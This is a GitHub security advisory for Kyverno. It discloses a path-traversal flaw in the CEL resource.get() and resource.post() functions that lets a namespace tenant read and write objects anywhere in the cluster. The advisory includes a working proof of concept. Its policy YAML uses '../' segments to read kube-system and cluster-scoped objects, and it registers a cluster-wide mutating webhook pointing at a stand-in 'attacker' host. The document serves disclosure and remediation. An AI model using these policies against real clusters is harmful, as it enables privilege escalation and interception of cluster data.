  "text": "\n\n \n \n\n\n\n\n \n \n \n \n \n \n \n \n\n \n \n \n \n \n \n \n \n \n \n \n\n \n\n \n\n \n\n \n \n \n \n \n \n\n \n\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n\n Namespaced CEL policies escape their namespace via path traversal in the resource argument of resource.get() and resource.post(), leading to cluster takeover · Advisory · kyverno/kyverno · GitHub \n\n\n\n \n \n \n \n\n \n \n\n\n \n\n\n \n\n\n \n \n\n \n \n\n \n\n \n\n\n\n\n\n \n\n \n\n\n\n\n \n\n \n\n \n\n \n\n \n\n \n\n \n \n \n\n \n \n \n\n\n\n\n \n\n\n\n \n\n\n \n \n \n \n\n \n\n\n\n \n\n \n \n\n\n \n\n\n \n\n \n \n\n \n \n \n\n \n \n\n\n \n\n \n\n \n \n \n \n\n \n Skip to content \n\n \n \n \n \n \n \n \n\n \n \n \n \n \n\n\n\n\n\n \n\n \n \n\n \n \n \n \n \n \n \n \n \n \n \n \n\n \n \n \n Navigation Menu Sign in Products Platform GitHub Repository hosting, code review, and collaboration Copilot AI coding agent for tasks, projects and automated work Build & Ship Actions CI/CD and automation Code Quality Quality analysis, fixes, and enforcement Codespaces Cloud development environments Secure Code Security Vulnerability detection and remediation Secret Protection Secret scanning and leak prevention All Features Developers Learn Documentation Training Certifications Build Build with Copilot Customize Copilot Integrations Explore Trending repos GitHub Sponsors Developer articles Changelog Changelog Your source for the latest features, improvements, and fixes across GitHub products, all in one place. Businesses By Stage Enterprises Team Startups Nonprofits By Industry Healthcare Financial services Manufacturing Government See all industries Evaluate GitHub Why GitHub Customer Stories Business insights Trust Center Add-ons GitHub Advanced Security Enterprise-grade code security Copilot for business Enterprise-grade AI features Premium Support Enterprise-grade 24/7 support Resources Learn & Connect Documentation Resource center Blog Events & webinars Community Forum Customer Stories Integrations Support Customer support Training GitHub Status Company About Partners Changelog GitHub Universe GitHub Universe The event for developers, by developers — talks, workshops, and what’s next for GitHub. Pricing Search / Sign in Sign up Appearance settings \n \n\n\n\n\n \n \n \n You signed in with another tab or window. Reload to refresh your session. \n You signed out in another tab or window. Reload to refresh your session. \n You switched accounts on another tab or window. Reload to refresh your session. \n\n \n Dismiss alert \n\n\n \n \n \n\n \n\n\n\n\n\n\n\n\n \n\n\n\n\n\n \n \n \n \n \n \n \n \n \n {{ message }} \n\n \n \n \n \n \n\n\n \n\n\n\n\n\n\n \n \n \n \n \n\n\n \n\n\n\n\n\n\n\n\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n\n \n \n \n kyverno kyverno Repository navigation Code Issues 442  ( 442 ) Pull requests 289  ( 289 ) Discussions Actions Projects Wiki Security and quality 60  ( 60 ) Insights More items \n \n\n\n \n\n\n\n \n \n \n\n\n\n \n \n \n \n \n \n kyverno \n Security \n Advisories \n GHSA-4pqm-wqq6-h9q2 \n \n \n\n \n\n \n \n\n \n Namespaced CEL policies escape their namespace via path traversal in the resource argument of resource.get() and resource.post(), leading to cluster takeover\n \n\n \n\n \n\n\n \n \n Critical\n \n \n\n \n JimBugwadia \n published\n GHSA-4pqm-wqq6-h9q2 \n Oct 21, 2026 \n\n \n \n \n \n\n\n \n\n \n \n \n \n \n \n \n \n \n Package \n\n \n \n \n\n \n github.com/kyverno/kyverno \n ( Go )\n \n \n \n\n \n Affected versions \n\n <= 1.19.0 \n \n\n \n Patched versions \n\n 1.19.2 \n \n \n\n \n \n\n\n \n \n Description \n \n\n \n \n Summary \n A tenant who can create a NamespacedValidatingPolicy in their own namespace can read and write \narbitrary objects anywhere in the cluster, using the Kyverno admission controller's ServiceAccount. \nThe namespace boundary that the namespaced CEL environment puts on resource.get() and \n resource.post() can be walked out of by putting .. segments in the resource argument. \n I reproduced this on v1.19.0 installed from the release install.yaml , on a kind cluster running \nKubernetes v1.32.2, with no configuration changes and no extra RBAC granted to Kyverno. \n This is the same class of problem as GHSA-79gf-7frw-68m9 ( CVE-2026-54523 ) and GHSA-cvq5-hhx3-f99p \n( CVE-2026-41068 ), and the fixes for both are present in the build I tested. The mechanism here is \ndifferent and neither fix stops it. \n Details \n For a namespaced policy the CEL environment registers only the overloads that have no namespace \nargument, and namespacedImpl fills in the policy's own namespace. That work landed in \n kyverno/sdk#115 and shipped in 1.18.2 and 1.19.0. \n The resource argument is not covered by any of that. It goes straight into \n pkg/cel/libs/context.go , which splits it on / : \n func ( cp * contextProvider ) GetResource ( apiVersion , resource , namespace , name string ) ( * unstructured. Unstructured , error ) {\n groupVersion , err := schema . ParseGroupVersion ( apiVersion )\n if err != nil {\n return nil , err \n\t}\n parts := strings . Split ( resource , \"/\" )\n resource = parts [ 0 ]\n subresources := parts [ 1 :]\n\n resourceInteface := cp . getResourceClient ( groupVersion , resource , namespace )\n return resourceInteface . Get ( context . TODO (), name , metav1. GetOptions {}, subresources ... )\n} \n PostResource is written the same way and hands the same slice to Create . \n Everything after the first / therefore becomes a client-go \"subresource\", chosen by the policy \nauthor. client-go validates the namespace and the name with rest.IsValidPathSegmentName , but it \ndoes not validate subresources at all: \n // k8s.io/client-go/dynamic/simple.go \n func ( c * dynamicResourceClient ) Get ( ctx context. Context , name string , opts metav1. GetOptions , subresources ... string ) ( * unstructured. Unstructured , error ) {\n if len ( name ) == 0 {\n return nil , fmt . Errorf ( \"name is required\" )\n\t}\n if err := validateNamespaceWithOptionalName ( c . namespace , name ); err != nil {\n return nil , err \n\t}\n var out unstructured. Unstructured \n if err := c . client . client .\n Get ().\n AbsPath ( append ( c . makeURLSegments ( name ), subresources ... ) ... ).\n ... \n} \n rest.Request.AbsPath assembles the path with path.Join , which resolves .. . The request that \ngoes on the wire is not the one the pinned namespace describes. \n Starting from /api/v1/namespaces/tenant-ns/configmaps/x , four .. segments get you back to \n /api/v1 and six get you to the root, so any path in the API is reachable, with the controller's \nidentity and RBAC. \n Every namespaced CEL policy type is affected, since the vpol, mpol, gpol, dpol and ivpol compilers \nall register resource.Lib . The generating and deleting variants run in the background and cleanup \ncontrollers, which usually hold different and often wider permissions. \n Proof of concept \n Cluster: kind v1.32.2, Kyverno v1.19.0 from \n https://github.com/kyverno/kyverno/releases/download/v1.19.0/install.yaml , applied unmodified. \n Setup. The tenant identity gets nothing outside its own namespace: \n kubectl create ns tenant-ns\nkubectl -n kube-system create configmap kv-canary --from-literal=canary= ' CLUSTER-SECRET-VALUE-7f3a2b ' \nkubectl -n tenant-ns create configmap local-cm --from-literal=hello=world\n\nkubectl apply -f - << ' EOF ' \n apiVersion: v1 \n kind: ServiceAccount \n metadata: {name: tenant-user, namespace: tenant-ns} \n --- \n apiVersion: rbac.authorization.k8s.io/v1 \n kind: Role \n metadata: {name: tenant-policy-author, namespace: tenant-ns} \n rules: \n - apiGroups: [\"policies.kyverno.io\"] \n resources: [\"namespacedvalidatingpolicies\"] \n verbs: [\"create\",\"get\",\"list\",\"update\",\"delete\",\"patch\"] \n - apiGroups: [\"\"] \n resources: [\"configmaps\"] \n verbs: [\"create\",\"get\",\"list\",\"delete\"] \n --- \n apiVersion: rbac.authorization.k8s.io/v1 \n kind: RoleBinding \n metadata: {name: tenant-policy-author, namespace: tenant-ns} \n roleRef: {apiGroup: rbac.authorization.k8s.io, kind: Role, name: tenant-policy-author} \n subjects: \n - {kind: ServiceAccount, name: tenant-user, namespace: tenant-ns} \n EOF \n Controls, so it is clear the tenant has no path of its own: \n $ kubectl auth can-i get configmaps -n kube-system --as=system:serviceaccount:tenant-ns:tenant-user\nno\n$ kubectl auth can-i get secrets -n kube-system --as=system:serviceaccount:tenant-ns:tenant-user\nno\n$ kubectl auth can-i create namespacedvalidatingpolicies.policies.kyverno.io -n tenant-ns --as=system:serviceaccount:tenant-ns:tenant-user\nyes\n \n A policy without traversal behaves as designed, reading only its own namespace, which confirms the \nconfinement is active in this build: \n messageExpression : \" 'BASELINE:' + string(resource.get('v1','configmaps','local-cm').data.hello) \" \n $ kubectl -n tenant-ns create configmap trigger1 --from-literal=a=b --as=system:serviceaccount:tenant-ns:tenant-user\nerror: failed to create configmap: admission webhook \"nvpol.validate.kyverno.svc-fail\" denied the request:\n Policy baseline-read failed: BASELINE:world\n \n 1. Reading another namespace \n Applied by the tenant ServiceAccount: \n apiVersion : policies.kyverno.io/v1 \n kind : NamespacedValidatingPolicy \n metadata : {name: exfil-read, namespace: tenant-ns} \n spec :\n validationActions : [Deny] \n matchConstraints :\n resourceRules :\n - apiGroups : [\"\"] \n apiVersions : [\"v1\"] \n resources : [\"configmaps\"] \n operations : [\"CREATE\"] \n validations :\n - expression : \" false \" \n messageExpression : >- \n 'LEAK:' + string(resource.get('v1', \n 'configmaps/../../../../namespaces/kube-system/configmaps/kv-canary','x').data.canary) \n $ kubectl -n tenant-ns create configmap trigger2 --from-literal=a=b --as=system:serviceaccount:tenant-ns:tenant-user\nerror: failed to create configmap: admission webhook \"nvpol.validate.kyverno.svc-fail\" denied the request:\n Policy exfil-read failed: LEAK:CLUSTER-SECRET-VALUE-7f3a2b\n \n The denial message is a convenient sink for a proof of concept, but it is not the only one. Audit \nannotations, reports and mutation output all carry the value back just as well. \n 2. Reading cluster scoped objects \n Six .. segments leave /api/v1 entirely: \n messageExpression : >- \n 'CLUSTERSCOPE roleRef=' + string(resource.get('v1', \n 'configmaps/../../../../../../apis/rbac.authorization.k8s.io/v1/clusterrolebindings/cluster-admin','x').roleRef.name) \n + ' subj0=' + string(resource.get('v1', \n 'configmaps/../../../../../../apis/rbac.authorization.k8s.io/v1/clusterrolebindings/cluster-admin','x').subjects[0].name) \n Policy t-cluster failed: CLUSTERSCOPE roleRef=cluster-admin subj0=system:masters\n \n Reads are still bounded by the controller's RBAC. Asking for a Secret in the default install gives: \n failed to get resource: permission denied: secrets \"kv-secret\" is forbidden:\nUser \"system:serviceaccount:kyverno:kyverno-admission-controller\" cannot get resource \"secrets\"\nin API group \"\" in the namespace \"kube-system\"\n \n Note that the request did reach kube-system ; only the ServiceAccount's permissions stopped it. \nClusters that follow the documented rbac.kyverno.io/aggregate-to-*-controller pattern so Kyverno \ncan clone Secrets or generate resources will not have that limit. \n 3. Writing a cluster scoped object, and what it costs \n resource.post() takes the same path. The default admission controller ClusterRole includes create \non webhook configurations: \n $ kubectl auth can-i create mutatingwebhookconfigurations --as=system:serviceaccount:kyverno:kyverno-admission-controller\nyes\n \n So the tenant can register a webhook for the whole cluster: \n messageExpression : >- \n 'CREATED:' + string(resource.post('v1', \n 'configmaps/../../../../../../apis/admissionregistration.k8s.io/v1/mutatingwebhookconfigurations', \n { \n \"apiVersion\": dyn(\"admissionregistration.k8s.io/v1\"), \n \"kind\": dyn(\"MutatingWebhookConfiguration\"), \n \"metadata\": dyn({\"name\": dyn(\"tenant-owns-the-cluster\")}), \n \"webhooks\": dyn([dyn({ \n \"name\": dyn(\"pwn.tenant.example.com\"), \n \"admissionReviewVersions\": dyn([dyn(\"v1\")]), \n \"sideEffects\": dyn(\"None\"), \n \"failurePolicy\": dyn(\"Fail\"), \n \"clientConfig\": dyn({\"url\": dyn(\"https://attacker.tenant-ns.svc:8443/mutate\")}), \n \"rules\": dyn([dyn({ \n \"apiGroups\": dyn([dyn(\"\")]), \n \"apiVersions\": dyn([dyn(\"v1\")]), \n \"operations\": dyn([dyn(\"CREATE\")]), \n \"resources\": dyn([dyn(\"configmaps\")]), \n \"scope\": dyn(\"*\") \n })]) \n })]) \n }).metadata.name) \n Policy t-takeover failed: CREATED:tenant-owns-the-cluster\n$ kubectl get mutatingwebhookconfiguration tenant-owns-the-cluster -o jsonpath='{.metadata.managedFields[*].manager}'\nkyverno\n \n With the endpoint pointing at a Service in the tenant's own namespace, a cluster-admin write in \n kube-system is now routed through the tenant: \n $ kubectl -n kube-system create configmap victim-write --from-literal=x=y # run as cluster-admin\nerror: failed to create configmap: Internal error occurred: failed calling webhook \"pwn.tenant.example.com\":\n failed to call webhook: Post \"https://attacker.tenant-ns.svc:8443/mutate?timeout=10s\":\n dial tcp: lookup attacker.tenant-ns.svc on 172.27.0.1:53: no such host\n \n I stopped at an unresolvable host on purpose. A rule set of apiGroups: [\"*\"], resources: [\"*\"] \nwith a listener the tenant actually runs gives them the body of every object created or updated in \nthe cluster, plus a JSONPatch on the way through. That is the whole cluster. \n Everything created by the proof of concept was deleted afterwards. \n Impact \n Privilege escalation from namespace tenant to cluster compromise. The prerequisite is create on \n namespacedvalidatingpolicies in one namespace, which is exactly what namespaced policy types exist \nto hand out, plus the ability to create whatever resource the policy matches, which the attacker \npicks. \n Scoring it as CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (9.9). Scope is changed because the \ndamage lands outside Kyverno, and availability is high because a webhook with failurePolicy: Fail \nmatching everything stops writes across the cluster. \n Suggested fix \n Reject any resource argument whose segments are not valid path segments. Running every element of \n subresources through rest.IsValidPathSegmentName before the client call would close it, since \nthat already rejects . , .. and % . Dropping the split-on- / behaviour in the CEL libraries \nwould close it too, if subresource access is not a feature anyone asked for. \n apiVersion deserves a look at the same time. schema.ParseGroupVersion accepts arbitrary group \nstrings, and the group also ends up as a path segment. \n ListResources is not affected: the dynamic client's List takes no subresources, and the split \ndiscards parts[1:] on that path. \n Versions \n Reproduced on v1.19.0 (current release at time of writing). The same code is in v1.18.2. Releases \nbefore the kyverno/sdk#115 boundary have a more direct version of the same problem, since namespaced \npolicies got the cluster-scoped overloads with an explicit namespace argument. \n Prior art, stated up front \n I looked for this before writing it up. GHSA-79gf-7frw-68m9 , GHSA-cvq5-hhx3-f99p , CVE-2026-22039 and \nthe CEL http.Get / http.Post advisory all cover namespaced policies escaping their namespace, and \nall of their fixes are in the v1.19.0 build I tested. I found no issue, pull request, branch or \nadvisory in kyverno/kyverno or kyverno/sdk that mentions subresource validation, path traversal in \nthe CEL libraries, or IsValidPathSegmentName , and no open pull request touches \n pkg/cel/libs/context.go . If I missed something, please close this out and I will not take up more \nof your time. \n Happy to test a patch against the same setup. \n \n \n\n \n\n \n \n\n\n\n\n\n \n\n \n \n Severity \n \n \n Critical\n \n\n \n \n \n 9.9 \n \n \n\n \n \n \n \n \n \n CVSS overall score\n \n \n \n \n \n \n \n \n \n \n This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS). \n \n \n \n \n / 10 \n \n \n CVSS v3 base metrics \n\n \n Attack vector\n Network \n \n Attack complexity\n Low \n \n Privileges required\n Low \n \n User interaction\n None \n \n Scope\n Changed \n \n Confidentiality\n High \n \n Integrity\n High \n \n Availability\n High \n \n \n \n Learn more about base metrics \n \n \n\n \n \n \n \n \n \n CVSS v3 base metrics\n \n \n \n \n \n \n \n \n \n \n \n \n Attack vector: \n More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability. \n \n \n Attack complexity: \n More severe for the least complex attacks. \n \n \n Privileges required: \n More severe if no privileges are required. \n \n \n User interaction: \n More severe when no user interaction is required. \n \n \n Scope: \n More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope. \n \n \n Confidentiality: \n More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user. \n \n \n Integrity: \n More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user. \n \n \n Availability: \n More severe when the loss of impacted component availability is highest. \n \n \n \n \n \n \n \n CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H \n\n \n\n \n \n CVE ID \n \n No known CVE\n \n \n\n \n Weaknesses \n \n \n Weakness \n CWE-22 \n \n \n \n Improper Limitation of a Pathname to a Restricted Directory \n The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory.\n Learn more on MITRE. \n\n \n \n\n \n \n Weakness \n CWE-269 \n \n \n \n Improper Privilege Management \n The product does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor.\n Learn more on MITRE. \n\n \n \n\n \n\n \n Credits \n\n \n \n \n \n \n zer0d4y5 \n\n \n Reporter \n\n \n\n \n\n \n \n\n\n\n\n \n\n \n \n\n\n \n\n \n\n \n \n\n \n Footer \n\n \n\n\n \n \n \n \n \n \n &copy; 2026 GitHub, Inc.\n \n \n\n \n Footer navigation \n\n \n\n\n \n Terms \n \n\n \n Privacy \n \n\n\n \n Security \n \n\n \n Status \n \n\n \n Community \n \n\n \n Docs \n \n\n \n Contact \n \n\n \n \n \n \n Manage cookies\n \n \n \n\n \n \n \n Do not share my personal information\n \n \n \n\n \n \n \n \n\n\n\n \n\n\n\n\n \n \n \n \n \n You can’t perform that action at this time.\n \n\n \n \n \n \n \n \n \n \n \n \n \n\n \n \n \n \n\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n\n\n\n\n \n \n \n \n \n"
